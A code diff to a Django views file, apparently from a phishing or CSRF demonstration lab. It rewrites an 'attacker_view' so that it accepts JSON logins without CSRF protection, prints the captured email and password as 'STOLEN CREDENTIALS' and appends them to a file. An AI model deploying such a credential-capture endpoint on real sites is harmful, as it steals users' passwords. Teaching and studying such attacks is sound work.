@@ -2,7 +2,9 @@ from django.shortcuts import render, redirect
 from django.contrib.auth import authenticate, login, logout
 from django.contrib.auth.decorators import login_required
 from django.contrib import messages
-
+import json
+from django.http import JsonResponse
+from django.views.decorators.csrf import csrf_exempt
 
 def login_view(request):
     """Handle user login"""
@@ -34,21 +36,33 @@ def logout_view(request):
         return redirect('login')
     return redirect('home')
 
+
+@csrf_exempt
 def attacker_view(request):
-    """Attacker page"""
     context = {}
     
     if request.method == 'POST':
-        email = request.POST.get('email')
-        password = request.POST.get('password')
-        
-        if email and password:
-            print(f"[ATTACKER] Captured - Email: {email}, Password: {password}")
-        
-        context['captured_email'] = email
-        context['captured_password'] = password
-        messages.success(request, 'Successfully logged in!')
-
+        try:
+            data = json.loads(request.body)
+            email = data.get('username')
+            password = data.get('password')
+            
+            if email and password:
+                print(f"[ATTACKER] STOLEN CREDENTIALS")
+                print(f"[ATTACKER] Email: {email}")
+                print(f"[ATTACKER] Password: {password}")
+                print(f"[ATTACKER] " + "="*50)
+                
+                # Save stolen credentials to file
+                with open('stolen_credentials.txt', 'a') as f:
+                    f.write(f"Email: {email}, Password: {password}\n")
+            
+            context['captured_email'] = email
+            context['captured_password'] = password
+            
+        except json.JSONDecodeError:
+            print("[ATTACKER] Failed to parse JSON")
+    
     return render(request, 'attacker.html', context)
 
 
